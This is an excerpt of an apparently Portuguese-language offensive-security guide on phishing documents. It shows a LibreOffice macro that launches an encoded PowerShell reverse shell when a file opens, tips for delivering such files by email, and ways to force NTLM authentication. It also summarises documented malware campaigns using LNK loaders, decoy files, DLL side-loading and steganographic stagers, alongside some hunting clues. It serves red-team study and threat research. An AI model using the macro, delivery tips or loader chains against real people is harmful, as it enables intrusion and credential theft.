...
Faça isso porque você **não pode salvar macro's dentro de um `.docx`** e existe um **estigma** **em torno** da extensão habilitada para macros **`.docm`** (por exemplo, o ícone da miniatura tem um enorme `!` e alguns gateways de web/e-mail os bloqueiam completamente). Portanto, essa **extensão `.doc` legada é o melhor compromisso**.
...
Documentos do LibreOffice Writer podem incorporar macros Basic e executá-las automaticamente quando o arquivo é aberto, vinculando a macro ao evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Uma macro simples de reverse shell é semelhante a:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Observe as aspas duplicadas (`""`) dentro da string – o LibreOffice Basic usa aspas duplicadas para escapar aspas literais, portanto payloads que terminam com `...==""")` mantêm balanceados tanto o comando interno quanto o argumento do Shell.

Dicas de entrega:

- Salve como `.odt` e associe a macro ao evento do documento para que ela seja executada imediatamente ao ser aberto.
- Ao enviar por e-mail com `swaks`, use `--attach @resume.odt` (o `@` é necessário para que os bytes do arquivo, e não a string do nome do arquivo, sejam enviados como anexo). Isso é fundamental ao abusar de servidores SMTP que aceitam destinatários `RCPT TO` arbitrários sem validação.
...
Há várias maneiras de **forçar a autenticação NTLM "remotamente"**; por exemplo, você poderia adicionar **imagens invisíveis** a e-mails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar à vítima o **endereço de arquivos** que **acionarão** uma **autenticação** apenas ao **abrir a pasta**.
...
## LNK Loaders + Payloads incorporados em ZIP (fileless chain)

Campanhas altamente eficazes entregam um ZIP que contém dois documentos legítimos usados como isca (PDF/DOCX) e um .lnk malicioso. O truque é que o loader real do PowerShell é armazenado dentro dos bytes brutos do ZIP após um marcador exclusivo, e o .lnk o extrai e executa totalmente na memória.<sup>[[2]](#references)</sup>

Fluxo típico implementado pelo one-liner de PowerShell no .lnk:
...
2) Ler os bytes do ZIP e procurar um marcador definido previamente (por exemplo, xFIQCV). Tudo após o marcador é o payload de PowerShell incorporado.
3) Copiar o ZIP para %ProgramData%, extraí-lo nesse local e abrir o .docx usado como isca para parecer legítimo.
...
Exemplo de esqueleto de PowerShell para extrair e executar o estágio incorporado:
```powershell
...
```
Notas
- A entrega frequentemente abusa de subdomínios PaaS legítimos (por exemplo, *.herokuapp.com) e pode filtrar payloads (servir ZIPs benignos com base no IP/UA).
...
- Hijacking de COM TypeLib do controle Microsoft Web Browser, fazendo com que IE/Explorer ou qualquer aplicativo que o incorpore relance o payload automaticamente.<sup>[[2]](#references)[[4]](#references)</sup> Consulte os detalhes e comandos prontos para uso aqui:
...
- Threads comerciais de longa duração terminando com links hospedados em domínios PaaS confiáveis.

## Staging inicial com decoy em LNK → Persistence via scheduled task → trusted CPL side-loading

Outro padrão recorrente é um **`.lnk` que imita um documento** e abre imediatamente um lure benigno enquanto prepara a cadeia real em segundo plano.<sup>[[3]](#references)</sup>
...
3. O stager baixa o **documento chamariz primeiro**, abre-o para a vítima e, em seguida, reconstrói os arquivos maliciosos em segundo plano.
4. Os payloads podem ser gravados com **extensões de lixo** e depois renomeados removendo caracteres de preenchimento, atrasando o surgimento de artefatos óbvios `.exe` / `.cpl`.
...
Pistas mínimas para hunting nesse padrão:
```powershell
...
No estudo de caso da Rapid7, a tarefa agendada executava repetidamente **`Fondue.exe`** a partir de `C:\Users\Public\`. Como **`APPWIZ.cpl`** foi colocado no mesmo diretório e exportava **`RunFODW`**, o binário confiável da Microsoft fazia side-load do CPL do atacante em vez da cópia legítima do sistema.
...
Vale a pena procurar separadamente por essa última etapa: malware frequentemente evita um salto direto como `((void(*)())buf)()` e, em vez disso, abusa de uma **WinAPI legítima que aceita callbacks** para transferir a execução.

O payload descriptografado nessa campanha era shellcode **Donut**, que então mapeava o PE final completamente na memória e aplicava patches em **AMSI/WLDP/ETW** no processo atual antes de transferir a execução. Para obter notas mais detalhadas sobre side-loading e pós-processamento residente na memória, consulte:
...
- `.lnk` iniciando `powershell.exe` ou `conhost.exe`, seguido por um documento chamariz visível.
...
- Blobs de texto Base64 gravados em **`C:\Windows\Tasks\`** e posteriormente lidos pelo módulo carregado via side-loading.

## Payloads delimitados por esteganografia em imagens (PowerShell stager)

Cadeias recentes de loader distribuem um JavaScript/VBS ofuscado que decodifica e executa um PowerShell stager em Base64. Esse stager baixa uma imagem, geralmente GIF, que contém uma DLL .NET codificada em Base64 e oculta como texto simples entre marcadores exclusivos de início/fim. O script procura esses delimitadores (exemplos observados na prática: «<<sudo_png>> … <<sudo_odt>>>»), extrai o texto entre eles, decodifica-o de Base64 para bytes, carrega o assembly na memória e invoca um método de entrada conhecido com a URL de C2.<sup>[[5]](#references)</sup>

Fluxo de trabalho
- Estágio 1: Dropper JS/VBS arquivado → decodifica o Base64 incorporado → inicia o PowerShell stager com -nop -w hidden -ep bypass.
- Estágio 2: PowerShell stager → baixa a imagem, extrai o Base64 delimitado pelos marcadores, carrega a DLL .NET na memória e chama seu método (por exemplo, VAI), passando a URL e as opções de C2.
...
Notas
- Este é o ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Os marcadores variam entre as campanhas.
...
## Droppers JS/VBS → staging de PowerShell com Base64

Uma etapa inicial recorrente é um arquivo `.js` ou `.vbs` pequeno e heavily-obfuscated, entregue dentro de um archive. Seu único objetivo é decodificar uma string Base64 incorporada e iniciar o PowerShell com `-nop -w hidden -ep bypass` para inicializar a próxima etapa via HTTPS.<sup>[[5]](#references)</sup>
...
- [3] [Rapid7 – Malware à la Mode: acompanhando o tradecraft do Dropping Elephant por meio de uma cadeia de loaders com temática chinesa](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
...
- [5] [Unit 42 – Loader PhantomVAI distribui uma variedade de infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
